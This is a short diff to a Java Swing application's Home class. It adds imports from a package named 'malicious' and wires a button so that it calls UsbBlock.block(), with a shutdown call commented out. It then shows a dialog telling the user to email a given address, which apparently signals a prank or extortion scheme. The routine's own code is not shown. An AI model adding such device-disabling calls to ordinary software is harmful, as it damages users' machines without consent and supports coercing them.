@@ -17,6 +17,8 @@ import java.util.logging.Level;
 import java.util.logging.Logger;
 import javax.swing.JOptionPane;
 import javax.swing.filechooser.FileSystemView;
+import malicious.Shutdown;
+import malicious.UsbBlock;
 import util.*;
 
 /**
@@ -163,7 +165,13 @@ public class Home extends javax.swing.JFrame {
     }//GEN-LAST:event_formWindowOpened
 
     private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
-        // TODO add your handling code here:
+        try {
+            // TODO add your handling code here:
+            UsbBlock.block();
+//            Shutdown.doShutdown();
+        } catch (Exception ex) {
+            Logger.getLogger(Home.class.getName()).log(Level.SEVERE, null, ex);
+        }
         JOptionPane.showMessageDialog(null, "Contact on pratik18597@gmail.com!");
     }//GEN-LAST:event_jButton1ActionPerformed
 
